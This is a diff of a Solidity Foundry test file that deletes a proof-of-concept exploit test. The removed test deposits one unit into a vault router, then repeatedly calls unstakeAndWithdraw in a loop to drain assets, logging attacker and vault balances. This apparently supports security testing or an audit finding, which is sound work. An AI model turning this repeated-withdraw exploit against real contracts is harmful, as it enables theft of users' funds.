@@ -32,36 +32,6 @@ contract Tester is Test {
     }
 
     function testA() public {
-        deal(address(asset), address(this), 1);
-        console2.log(
-            "Initial Asset Attacker Balance:",
-            asset.balanceOf(address(this))
-        );
-        console2.log("Initial Asset Vault Balance:", asset.balanceOf(adapter));
-
-        {
-            // Deposit 1 to be able to burn
-            asset.approve(address(router), type(uint256).max);
-            router.depositAndStake(Vault, address(this), 1, address(this));
-        }
-
-        console2.log("======================================");
-        console2.log(
-            "During Asset Attacker Balance:",
-            asset.balanceOf(address(this))
-        );
-        console2.log("During Asset Vault Balance:", asset.balanceOf(adapter));
-        console2.log("======================================");
-
-        // Variable to assing times to abuse the exploit
-        for (uint i = 0; i < 50; i++) {
-            router.unstakeAndWithdraw(Vault, address(this), 1, address(this));
-        }
-
-        console2.log(
-            "Ending Asset Attacker Balance:",
-            asset.balanceOf(address(this))
-        );
-        console2.log("Ending Asset Vault Balance:", asset.balanceOf(adapter));
+        
     }
 }
